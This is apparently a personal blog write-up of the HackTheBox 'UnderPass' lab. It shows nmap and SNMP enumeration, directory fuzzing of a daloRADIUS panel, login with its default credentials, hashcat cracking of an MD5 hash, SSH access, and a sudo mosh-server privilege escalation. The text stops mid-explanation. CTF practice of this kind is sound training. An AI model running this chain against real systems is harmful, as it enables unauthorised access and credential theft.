---
title: UnderPass Lab HackTheBox
date: 28-01-2025
layout: post
categories: HackTheBox
tags:
  - blog
  - hachthebox
  - easy
  - linux
  - ctf
top: 1
---

- First, for any Hack The Box lab, I always add DNS settings for the IP of the Hack The Box lab into `/etc/hosts`.

~~~ 
sudo echo "10.10.11.48 underpass.htb" | tee -a /etc/hosts 
~~~

## 1. UDP Enumeration

- At first, I used `nmap` to scan the ports  but there was no vulnerability for me to exploit.

~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ nmap -A 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 13:35 EST
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   40.40 ms 10.10.14.1
2   40.49 ms underpass.htb (10.10.11.48)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
~~~


- Then I proceed to scan the IP address UDP ports of the lab, I found port 161 contains snmp service which can be exploited. `SNMP (Simple Network Management Protocol)` is an application layer protocol in TCP/IP model, used to manage and monitor all network devices and related funtions.
~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ nmap -sU -sC -sV --top-ports  100 10.10.11.48 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 11:01 EST
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.040s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE VERSION
161/udp  open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 31
|_  snmpEngineTime: 4h49m18s
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 4h49m17.93s (1735793 timeticks)
1812/udp open|filtered radius
1813/udp open|filtered radacct
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 251.79 seconds
~~~

- Next I used `Metasploit` to exploit the server's `SNMP` service. Then I found out the server uses `Daloradius Server`.

~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ msfconsole

msf6 > use auxiliary/scanner/snmp/snmp_enum
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.11.48
RHOSTS => 10.10.11.48
msf6 auxiliary(scanner/snmp/snmp_enum) > run
[+] 10.10.11.48, Connected.

[*] System information:

Host IP                       : 10.10.11.48
Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
Contact                       : steve@underpass.htb
Location                      : Nevada, U.S.A. but not Vegas
Uptime snmp                   : 05:08:57.20
Uptime system                 : 05:08:47.40
System date                   : 2025-1-27 16:08:39.0
~~~

- I run FUZZ directory with tool like `dirsearch`.

~~~
──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ dirsearch -u "http://underpass.htb/daloradius/" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/trit/HackTheBox/UnderPass/reports/http_underpass.htb/_daloradius__25-01-27_11-28-07.txt

Target: http://underpass.htb/

[11:28:07] Starting: daloradius/
[11:28:11] 200 -  221B  - /daloradius/.gitignore
[11:28:35] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[11:28:42] 200 -   24KB - /daloradius/ChangeLog
[11:28:49] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[11:28:49] 200 -    2KB - /daloradius/docker-compose.yml
[11:28:49] 200 -    2KB - /daloradius/Dockerfile
[11:29:04] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
[11:29:04] 200 -   18KB - /daloradius/LICENSE
[11:29:25] 200 -   10KB - /daloradius/README.md
[11:29:30] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/

Task Completed
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ dirsearch -u "http://underpass.htb/daloradius/app" -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/trit/HackTheBox/UnderPass/reports/http_underpass.htb/_daloradius_app_25-01-27_11-30-24.txt

Target: http://underpass.htb/

[11:30:24] Starting: daloradius/app/
[11:30:59] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[11:32:01] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[11:32:01] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
[11:32:01] 200 -    2KB - /daloradius/app/users/login.php

Task Completed
~~~

- I found the default service account on the Internet `administrator/radius` but no success. I did a FUZZ but using `seclists` and found another directory that can be logged in with the default account.

~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ dirsearch -u "http://underpass.htb/daloradius/app" -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545

Output File: /home/trit/HackTheBox/UnderPass/reports/http_underpass.htb/_daloradius_app_25-01-27_11-37-39.txt

Target: http://underpass.htb/

[11:37:39] Starting: daloradius/app/
[11:37:41] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[11:37:42] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[11:38:24] 301 -  333B  - /daloradius/app/operators  ->  http://underpass.htb/daloradius/app/operators/

~~~

- Then, I logged domain `http://underpass.htb/daloradius/app/operators` with default account `administrator/radius` and It works.


##  2. SSH Connection.

- **In Users -> Click Go to user list -> find user `svcMosh` and password hash `412DD4759978ACFCC81DEAB01B382403` **

- After that, in command used tool `hash-identifier` to find out the password encryption type.

~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 412DD4759978ACFCC81DEAB01B382403

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
~~~

~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ echo "412DD4759978ACFCC81DEAB01B382403" >> hash


┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt 

412dd4759978acfcc81deab01b382403:underwaterfriends        


Argument				Function
-m 0					Tells hashcat which mode to use. 0 is MD5.
Hashes					Our file containing the our MD5 password hashes.
/usr/share/wordlists/rockyou.txt	Points hashcat to the wordlist containing the passwords to hash and compare.
~~~

- Connect ssh server, login with account `svcMosh/underwaterfriends`.

~~~
┌──(trit㉿chimp)-[~/HackTheBox/UnderPass]
└─$ ssh svcMosh@10.10.11.48      

svcMosh@underpass:~$ ls
user.txt
svcMosh@underpass:~$ cat user.txt 
17d720a428*****8d27452355a253ba9
~~~


- Trying to escalate privileges:

~~~
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
~~~

~~~
mosh --server="sudo /usr/bin/mosh-server" localhost
~~~


**What it Does:
mosh: This is the Mosh (Mobile Shell) client, which is a tool for remote terminal access, offering features like better responsiveness, reliability over unreliable networks, and automatic reconnection.

 server=”sudo /usr/bin/mosh-server”: This specifies a custom command to run the Mosh server on the remote machine. Here:

sudo is used to execute the mosh-server with elevated privileges.
/usr/bin/mosh-server is the full path to the mosh-server binary.
localhost: Specifies the target host for the Mosh connection, which in this case is localhost (i.e., the local machine).






